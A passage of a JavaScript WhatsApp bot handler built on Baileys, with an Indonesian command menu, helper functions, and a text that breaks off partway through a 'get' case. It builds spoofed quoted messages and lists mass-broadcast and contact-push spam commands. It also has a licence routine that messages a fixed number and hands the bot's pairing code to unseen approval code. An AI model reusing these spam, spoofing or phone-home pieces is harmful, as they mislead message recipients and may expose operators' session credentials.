require("./settings/settings")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs');
const nou = require("node-os-utils");
const settings = require('./settings/settings.js');
const { videoUrls, produkList, idmerchant,qrisorkut, apikeyorkut, pwOrkut, pinOrkut } = require('./settings/settings.js');
const util = require('util')
const body = m.text || "";
const axios = require('axios');
const ms = require("parse-ms");
const { handleOrderNokos } = require("./serverside/ordernokos");
const userBalances = {};
const list = JSON.parse(fs.readFileSync("./serverside/list.json"))
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const cheerio = require('cheerio')
const speed = require('performance-now')
const os = require('os')
const path = require('path')
const antispam = require("./serverside/antispam");
const { mediafire } = require('./serverside/scrape-mediafire');
const api = require('btch-downloader')
const config = require('./security/adiwConfig')
const { checkApproval, approveScript, isApproved, validateApprovalData, checkScriptIntegrity } = require('./security/adiwajs')
const archiver = require('archiver')
const timestampp = speed();
const crypto = require('crypto');
const { Client } = require('ssh2');
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${global.namaowner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${global.namaowner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
const filePath = "./serverside/listData.json";
const settingsPath = './settings/owner.js';
require(settingsPath); 
const latensi = speed() - timestampp
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom, formatp } = require('./serverside/libary/myfunc')
const { spotifyDown } = require('./serverside/libary/spotify')
const prem = require("./serverside/libary/premium");
const ytdl = require('@vreden/youtube_scraper');
let premium = JSON.parse(fs.readFileSync('./serverside/system/premium.json'));

module.exports = async (cupen, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (cupen.user.id.split(':')[0]+'@s.whatsapp.net' || cupen.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await cupen.decodeJid(cupen.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''

const groupMetadata = m.isGroup ? await cupen.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const { db, saveDB } = require('./serverside/database');
const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}
global.db = db;
    
process.on('exit', saveDB);
process.on('SIGINT', saveDB);
process.on('uncaughtException', saveDB);

// Database path
let linkRegex = /https:\/\/open\.spotify\.com\/track\/[0-9A-Za-z]+/i;


// Console message
if (m.message) {
console.log(
    chalk.inverse(' 📬  [ Message ] ') + 
    ' ' + 
    chalk.black.bgGreen(new Date().toLocaleString()) + 
    ' ' + 
    chalk.black.bgBlue(budy || m.mtype) + '\n' +
    chalk.magenta('📣 Dari: ') + chalk.green(pushname) + ' ' + chalk.yellow(`(${m.sender})`) + '\n' +
    chalk.bgMagenta('📍 Di: ') + chalk.green(m.isGroup ? 'Grup' : 'Private Chat') + ' ' + chalk.green(from) + 
    '\n' + chalk.greenBright('✧──────── ❀SalwaCantik❀ ─────────✧')
   );
 }
if (!m.chat) return m.reply('Error: JID tidak ditemukan!');
 global.db = global.db || { users: {}, groups: {}, settings: {} };  
 if (!global.db.users[m.sender]) {
    global.db.users[m.sender] = { saldo: 0, items: [] };
}  
// Self & public
if (!cupen.public) {
if (!m.key.fromMe) return
} 
if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify([]));
}
// Function Sinkron
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
 function getUserBalance(user) {
    return userBalances[user] || 0;
}
 function updateUserBalance(user, amount) {
    userBalances[user] = (userBalances[user] || 0) + amount;
}  
async function toIDR(x) {
x = x.toString()
var pattern = /(-?\d+)(\d{3})/
while (pattern.test(x))
x = x.replace(pattern, "$1.$2")
return x
}
 function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
} 
function getLeaderboard() {
    const sorted = Object.entries(userBalances).sort(([, a], [, b]) => b - a);
    return sorted.slice(0, 10); 
}
const capital = (string) => {
  return string.charAt(0).toUpperCase() + string.slice(1);
}    
async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res?.duration == 0) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				data.push({
					type: 'watermark',
					url: 'https://www.tikwm.com' + res?.wmplay || "/undefined",
				}, {
					type: 'nowatermark',
					url: 'https://www.tikwm.com' + res?.play || "/undefined",
				}, {
					type: 'nowatermark_hd',
					url: 'https://www.tikwm.com' + res?.hdplay || "/undefined"
				})
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			
		}
	});
} 
function formatNumber(number) {
    return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}    
function readList() {
    return JSON.parse(fs.readFileSync(filePath));
}
function getFileTypeFromUrl(url) {
    const parts = url.split('.');
    return parts[parts.length - 1];
}
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}    
  function writeList(data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}  
let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }
    
async function connectToWhatsApp() {
    if (!(await isApproved())) {
        if (m.sender.includes(config.approval.num) && budy.includes(config.approval.text)) {
            await approveScript(m.sender, cupen.authState.creds.pairingCode);
            await m.reply(config.approval.greet);
        } else {
            await checkApproval();
        }
    }
}

connectToWhatsApp();
if (!await isApproved() && isCmd) {
    return;
}
checkScriptIntegrity();
if (await isApproved()) {
    validateApprovalData(cupen.authState.creds.pairingCode);
} 
if (!fs.existsSync('./security/approval')) {
cupen.sendMessage(config.approval.num + '@s.whatsapp.net', { text: 'Hallo SalwaCantik, Saya Membutuhkan Akses Vip Untuk Mengakses Bot!!!' })
    
fs.writeFileSync('./security/approval', '', 'utf8');
}
if (isCmd && !m.key.fromMe && antispam) {
if (antispam.isFiltered(m.sender)) return m.reply(`*( Anti Spam )* *Jeda 5 Detik.. Anda Dibanned Selama 1 Tahun!!.*`)
antispam.addFilter(m.sender)
}

    
    
// Variable 

const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": '❀SalwaCantik❀',
                    "jpegThumbnail": ''
                          }
                        }
                      }
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
try {
const data = fs.readFileSync('cupen.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Bᴜᴋᴀɴ Bᴇɢɪᴛᴜ Aɴᴊɪʀ Kᴏᴄᴀᴋ Dᴀʜ, Yᴀɴɢ Bᴇɴᴇʀ Gɪɴɪ:\n⇝ ${prefix+mean}\n\⇝ Kᴇᴍɪʀɪᴘᴀɴ: ${similarityPercentage}%`
m.reply(response)
}}
    
const totalFitur = () =>{
            var mytext = fs.readFileSync("./cupen.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        
const imageUrls = [
        'https://files.catbox.moe/fh0a6r.jpg',
        'https://files.catbox.moe/fh0a6r.jpg'
    ];

    // Randomized Image © ❀SalwaCantik❀
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];

const reply = async (teks) => {
return cupen.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `❀SalwaCantik❀`,
body: `🔴 Active : ${runtime(process.uptime())}`,
previewType: "VIDEO",
thumbnail: randomImageUrl,
sourceUrl: `https://files.catbox.moe/fh0a6r.jpg`,
mediaUrl: `https://files.catbox.moe/fh0a6r.jpg`
}
},
text: teks
}, {
quoted: m
})
}


// Function Asinkron ( Async )
async function deobfuscateCode(text) {
        const result = deobfuscate(text);
        return result;
}
async function sendOfferCall(target) {
    try {
        await cupen.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
    
 let fiturNew = {};
try {
    fiturNew = JSON.parse(fs.readFileSync('./fiturnew.json', 'utf8'));
} catch (e) {
    console.error("Terjadi kesalahan saat membaca fiturnew.json", e);
    fiturNew = { fitur: [] }; // Jika file tidak ada, inisialisasi sebagai array kosong
}  
    

async function EncryptJs(code) {
    let res = await fetch(`https://api.alyachan.dev/api/obfuscator?code=${code}&apikey=keymu`);
    let jsonResponse = await res.json(); // Mendapatkan respons JSON

    if (jsonResponse.status) {
        return jsonResponse.data; // Mengembalikan bagian data dari respons (kode yang telah diobfuscate)
    } else {
        throw new Error(jsonResponse.message || 'Terjadi kesalahan dalam obfuscation');
    }
}


async function EncryptJs2(code) {
    let res = await fetch(`https://ai.xterm.codes/api/tools/js-protector?code=${code}&key=keymu`);
    let jsonResponse = await res.json(); // Mendapatkan respons JSON
    return jsonResponse.data; // Mengembalikan bagian data dari respons
}


    
switch(command) {
case 'salwa':
{
 const videoUrls = settings.videoUrls;
 const currentVideoUrl = videoUrls[global.menuVideoIndex];

 global.menuVideoIndex = (global.menuVideoIndex + 1) % videoUrls.length;

 const emojiReactions = ['💢', '⚡', '🥶'];
 const currentEmojiIndex = global.emojiIndex || 0;
 const emojiReaction = emojiReactions[currentEmojiIndex];
 global.emojiIndex = (currentEmojiIndex + 1) % emojiReactions.length;

 await cupen.sendMessage(m.chat, {
 react: {
 text: emojiReaction,
 key: m.key,
 },
 });

 let menu = ` *_❒── 「 Iɴғᴏʀᴍᴀsɪ ❀SalwaCantik❀ 」 ──❒_*
ぇ *_Nᴀᴍᴀ Oᴡɴᴇʀ : ${global.namaowner}_*
ぇ *_Nᴀᴍᴀ Bᴏᴛ : ${global.namabot}_*
ぇ *_Lɪʙʀᴀʀʏ : @Whiskeysockets/baileys_*
ぇ *_Aᴋᴛɪғ : ${runtime(process.uptime())}_*
ぇ *_Tᴏᴛᴀʟ Fɪᴛᴜʀ : ${totalFitur()}_*
───────────────────
え *_Hᴀʟʟᴏ Pᴇʀᴋᴇɴᴀʟᴋᴀɴ Sᴀʏᴀ Aᴅᴀʟᴀʜ ❀SalwaCantik❀ Sᴀʏᴀ Dɪ Rᴀɴᴄᴀɴɢ Uɴᴛᴜᴋ Mᴇᴍʙᴀɴᴛᴜ Aɴᴅᴀ Uɴᴛᴜᴋ Mᴇʀɪɴɢᴀɴᴋᴀɴ Bᴇʙᴀɴ Hɪᴅᴜᴘ Aɴᴅᴀ._*
え *_Sɪʟᴀʜᴋᴀɴ Kᴇᴛɪᴋ_* *_${global.kiw}salwacantik${global.kiw}_* *_Uɴᴛᴜᴋ Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Sᴇᴍᴜᴀ Mᴇɴᴜ._*
───────────────────
> *_© Developer ❀SalwaCantik❀_*
 `;

const thumbnailPath = './media/thumbnail.jpg';
 await cupen.sendMessage(m.chat, {
 video: { 
 url: currentVideoUrl 
 },
 caption: menu,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀ - V4',
 body: 'Simple Bot WhatsApp',
 mediaType: 1,
 renderLargerThumbnail: false,
 thumbnail: fs.readFileSync(thumbnailPath)
 },
 },
 }, { quoted: fkontak });

 const audioPath = './audio.mp3'; 
 await cupen.sendMessage(m.chat, {
 audio: { url: audioPath },
 mimetype: 'audio/mp4', 
 ptt: true, 
 },{ quoted: fkontak});
}
break;

case 'salwacantik':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 const videoUrls = settings.videoUrls;
 const currentVideoUrl = videoUrls[global.menuVideoIndex];

 global.menuVideoIndex = (global.menuVideoIndex + 1) % videoUrls.length;

 const emojiReaction = '♨️';

 await cupen.sendMessage(m.chat, {
 react: {
 text: emojiReaction,
 key: m.key,
 },
 });

 let menu = `
*_❒── 「 Bᴜʏ Oᴛᴏᴍᴀᴛɪs Oʀᴋᴜᴛ 」 ──❒_*
❀SalwaCantik❀
 ぇ ʙᴜʏᴘʀᴏᴅᴜᴋ
 ぇ ʟɪsᴛᴘʀᴏᴅᴜᴋ
 ぇ ᴜᴘʜᴀʀɢᴀ
 ぇ ᴀᴅᴅᴘʀᴏᴅᴜᴋ
 ぇ ᴅᴇʟᴘʀᴏᴅᴜᴋ
 ぇ ʙᴜʏᴠᴘs
 ぇ ʙᴜʏᴘᴀɴᴇʟ
 ぇ ʙᴜʏᴘᴀɴᴇʟᴘʀɪᴠᴀᴛᴇ
 ぇ ʙᴜʏᴀᴅᴍɪɴᴘᴀɴᴇʟ
 ぇ ᴄᴇᴋsᴀʟᴅᴏ-ᴏʀᴋᴜᴛ
 ぇ ʙᴀᴛᴀʟʙᴇʟɪ
 ぇ ǫʀɪs
❀SalwaCantik❀
*_❒── 「 Tᴏᴏʟs 」 ──❒_*
❀SalwaCantik❀
ぇ ᴛᴏᴜʀʟ
ぇ ɢᴇᴛ
ぇ ᴇɴᴄʀʏᴘᴛ
ぇ ᴇɴᴄʀʏᴘᴛᴠ2
ぇ ᴅᴇᴄʀʏᴘᴛ
ぇ sᴛɪᴄᴋᴇʀ
ぇ sʜᴏʀᴛʟɪɴᴋ
ぇ ɢɪᴘʜʏ
ぇ ᴄᴜᴀᴄᴀ
ぇ ᴄᴇᴋɪᴘ
ぇ ᴛʀᴀɴsʟᴀᴛᴇ
ぇ ᴄʜᴀᴛʙᴏᴛ
ぇ ʀᴠᴏ
ぇ ᴀᴅᴅʀᴇsᴘᴏɴ
ぇ ʟɪsᴛʀᴇsᴘᴏɴ
ぇ ᴅᴇʟʀᴇsᴘᴏɴ
ぇ ʟɪsᴛ
ぇ ᴀᴅᴅʟɪsᴛ
ぇ ᴅᴇʟʟɪsᴛ
ぇ ɪᴅᴄʜ
❀SalwaCantik❀
*_❒── 「 Dᴏᴡɴʟᴏᴀᴅᴇʀ 」 ──❒_*
❀SalwaCantik❀
ぇ sᴘᴏᴛɪғʏ 
ぇ ᴛɪᴋᴛᴏᴋ2 
ぇ ᴘʟᴀʏ 
ぇ ᴍᴇᴅɪᴀғɪʀᴇ
ぇ ᴍᴇᴅɪᴀғɪʀᴇ2 
ぇ ᴘʟᴀʏ-ᴠ2 
❀SalwaCantik❀
*_❒── 「 PᴜsʜRᴀɴᴋ 」 ──❒_*
❀SalwaCantik❀
ぇ ᴄʀᴀᴛᴇᴘᴜsʜ
ぇ ʟɪsᴛᴘᴜsʜ
ぇ sᴛᴀʀᴛᴘᴜsʜ
ぇ sᴛᴏᴘᴘᴜsʜ
ぇ ʟɪsᴛɪᴅɢʙ
ぇ ᴊᴘᴍ
ぇ ᴊᴘᴍsʟɪᴅᴇ
ぇ ᴊᴘᴍᴄʜ
ぇ ᴊᴘᴍʜɪᴅᴇᴛᴀɢ
ぇ ᴊᴘᴍᴄʜғᴏᴛᴏ
ぇ ᴅᴇʟʙʟᴊᴘᴍ
ぇ ʟɪsᴛᴅᴀғᴛᴀʀʙʟ
ぇ ʙʟᴀᴄᴋʟɪsᴛᴊᴘᴍ
❀SalwaCantik❀
*_❒── 「 SᴘᴇᴄɪᴀʟMᴇɴᴜ 」 ──❒_*
❀SalwaCantik❀
ぇ ʜʙᴘᴀɴᴇʟ
ぇ ᴄʟᴇᴀʀᴀʟʟ
ぇ ᴄʟᴇᴀʀᴀʟʟ2
ぇ ᴄʟᴇᴀʀᴀʟʟ3
ぇ ᴅᴏᴍᴀɪɴ
ぇ sᴜʙᴅᴏᴍᴀɪɴ
ぇ ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ 
ぇ ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ 
ぇ sᴛᴀʀᴛᴡɪɴɢs 
ぇ ɪɴsᴛᴀʟʟᴛᴇᴍᴀᴇɴɪɢᴍᴀ 
ぇ ᴜɴɪɴsᴛᴀʟʟᴛᴇᴍᴀ 
ぇ ɪɴsᴛᴀʟʟᴛᴇᴍᴀɴɪɢʜᴛ 
ぇ ʟɪsᴛᴅʀᴏᴘʟᴇᴛ
ぇ ʀᴇsᴛᴀʀᴛᴠᴘs
ぇ sɪsᴀᴅʀᴏᴘʟᴇᴛ
ぇ ʀᴇʙᴜɪʟᴅ
ぇ ᴅᴇʟᴇᴛᴇᴅʀᴏᴘʟᴇᴛ
ぇ ᴄʜᴀɴɢᴇᴀᴘɪ
ぇ ʀ1ᴄ1 
ぇ ʀ2ᴄ1 
ぇ ʀ4ᴄ2 
ぇ ʀ8ᴄ4 
ぇ ʀ16ᴄ4 
ぇ ʀᴇɪɴsᴛᴀʟʟ 
ぇ ʀᴇsᴛᴀʀᴛsʀᴠ 
ぇ sᴜsᴘᴇɴᴅ 
ぇ ᴀᴅᴅᴅʙ
ぇ ʟɪsᴛᴅʙ
ぇ ᴅᴇʟᴅʙ
❀SalwaCantik❀
*_❒── 「 Oᴡɴᴇʀ 」 ──❒_*
❀SalwaCantik❀
ぇ ʙᴀᴄᴋᴜᴘ
ぇ ᴄʟᴇᴀʀ 
ぇ sᴇʟғ
ぇ ᴘᴜʙʟɪᴄ 
ぇ ᴀᴅᴅᴏᴡɴᴇʀ
ぇ ᴅᴇʟᴏᴡɴᴇʀ 
ぇ ʟɪsᴛᴏᴡɴᴇʀ 
ぇ ᴀᴅᴅᴘʀᴇᴍ
ぇ ᴅᴇʟᴘʀᴇᴍ 
ぇ ɢᴇᴛᴄᴀsᴇ 
ぇ ʀᴇɴᴀᴍᴇᴄᴀsᴇ
ぇ ᴀᴅᴅᴄᴀsᴇ 
ぇ ᴅᴇʟᴄᴀsᴇ 
ぇ ɢᴇᴛғᴜɴᴄ
ぇ ᴇᴅɪᴛᴄᴀsᴇ
ぇ sᴇᴛᴘᴘʙᴏᴛ
ぇ ғɪᴛᴜʀɴᴇᴡ
ぇ ᴀᴅᴅғɪᴛᴜʀ 
ぇ ᴄʟᴇᴀʀғɪᴛᴜʀ
ぇ ᴘʀᴏsᴇs 
ぇ ᴅᴏɴᴇ
ぇ ᴘᴀʏᴍᴇɴᴛ
❀SalwaCantik❀
*_❒── 「 GʀᴏᴜᴘMᴇɴᴜ 」 ──❒_*
❀SalwaCantik❀
ぇ ᴏᴘᴇɴɢʀᴏᴜᴘ
ぇ ᴄʟᴏsᴇɢʀᴏᴜᴘ
ぇ sᴇᴛᴘᴘɢʙ
ぇ sᴇᴛᴅᴇᴋs 
ぇ sᴇᴛɴᴀᴍᴀɢʙ 
ぇ ᴋɪᴄᴋ 
ぇ ʜɪᴅᴇᴛᴀɢ 
ぇ ʟɪɴᴋɢᴄ 
ぇ ᴘʀᴏᴍᴏᴛᴇ
ぇ ᴅᴇᴍᴏᴛᴇ
ぇ ᴄʟᴏsᴇᴛɪᴍᴇ
ぇ ᴏᴘᴇɴᴛɪᴍᴇ
❀SalwaCantik❀
*_❒── 「 Cᴘᴀɴᴇʟ V1 」 ──❒_*
❀SalwaCantik❀
ぇ ᴜᴘᴅᴏᴍᴀɪɴ 
ぇ ᴜᴘᴀᴘɪᴋᴇʏ 
ぇ ᴜᴘᴄᴀᴘɪᴋᴇʏ 
ぇ ʟɪɴᴋsᴇʀᴠᴇʀ 
ぇ ᴄᴘᴀɴᴇʟ 
ぇ ᴄᴀᴅᴍɪɴ 
ぇ ʟɪsᴛᴀᴅᴍɪɴ 
ぇ ʟɪsᴛsᴇʀᴠᴇʀ 
ぇ ʟɪsᴛᴜsᴇʀ 
ぇ ᴅᴇʟᴀᴅᴍɪɴ 
ぇ ᴅᴇʟsᴇʀᴠᴇʀ 
ぇ ᴅᴇʟᴜsᴇʀ 
ぇ ᴄʟᴇᴀʀᴀᴅᴍɪɴ 
ぇ ᴄʟᴇᴀʀsᴇʀᴠᴇʀ 
ぇ ᴄʟᴇᴀʀᴜsᴇʀ 
❀SalwaCantik❀
*_❒── 「 Cᴘᴀɴᴇʟ V2 」 ──❒_*
❀SalwaCantik❀
ぇ ᴜᴘᴅᴏᴍᴀɪɴ2 
ぇ ᴜᴘᴀᴘɪᴋᴇʏ2 
ぇ ᴜᴘᴄᴀᴘɪᴋᴇʏ2 
ぇ ʟɪɴᴋsᴇʀᴠᴇʀ 
ぇ ᴄᴘᴀɴᴇʟ 
ぇ ᴄᴀᴅᴍɪɴ2 
ぇ ʟɪsᴛᴀᴅᴍɪɴ2 
ぇ ʟɪsᴛsᴇʀᴠᴇʀ2 
ぇ ʟɪsᴛᴜsᴇʀ2 
ぇ ᴅᴇʟᴀᴅᴍɪɴ2 
ぇ ᴅᴇʟsᴇʀᴠᴇʀ2 
ぇ ᴅᴇʟᴜsᴇʀ2 
ぇ ᴄʟᴇᴀʀᴀᴅᴍɪɴ2 
ぇ ᴄʟᴇᴀʀsᴇʀᴠᴇʀ2 
ぇ ᴄʟᴇᴀʀᴜsᴇʀ2 
❀SalwaCantik❀
*_❒── 「 Cᴘᴀɴᴇʟ V3 」 ──❒_*
❀SalwaCantik❀
ぇ ᴜᴘᴅᴏᴍᴀɪɴ3
ぇ ᴜᴘᴀᴘɪᴋᴇʏ3 
ぇ ᴜᴘᴄᴀᴘɪᴋᴇʏ3 
ぇ ʟɪɴᴋsᴇʀᴠᴇʀ
ぇ ᴄᴘᴀɴᴇʟ 
ぇ ᴄᴀᴅᴍɪɴ3 
ぇ ʟɪsᴛᴀᴅᴍɪɴ3 
ぇ ʟɪsᴛsᴇʀᴠᴇʀ3 
ぇ ʟɪsᴛᴜsᴇʀ3 
ぇ ᴅᴇʟᴀᴅᴍɪɴ3 
ぇ ᴅᴇʟsᴇʀᴠᴇʀ3 
ぇ ᴅᴇʟᴜsᴇʀ3 
ぇ ᴄʟᴇᴀʀᴀᴅᴍɪɴ3 
ぇ ᴄʟᴇᴀʀsᴇʀᴠᴇʀ3 
ぇ ᴄʟᴇᴀʀᴜsᴇʀᴇʀ3 
> ❀SalwaCantik❀
 `;

const thumbnailPath = './media/thumbnail.jpg';
 await cupen.sendMessage(m.chat, {
 video: { 
 url: currentVideoUrl 
 },
 caption: menu,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀ - V4',
 body: 'Simple Bot WhatsApp',
 mediaType: 1,
 renderLargerThumbnail: false,
 thumbnail: fs.readFileSync(thumbnailPath)
 },
 },
 }, { quoted: fkontak });

 const audioPath = './audio.mp3'; 
 await cupen.sendMessage(m.chat, {
 audio: { url: audioPath },
 mimetype: 'audio/mp4', 
 ptt: true, 
 },{ quoted: fkontak });
}
break;


      
case 'get': {
if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!text) return m.reply("Please Input url.\nExample: .get https://e.top4top.io/p_3229zf3gp0.jpg");
try {
var check = await fetchJson(text);
let jsonContent = JSON.stringify(check, null, 2);
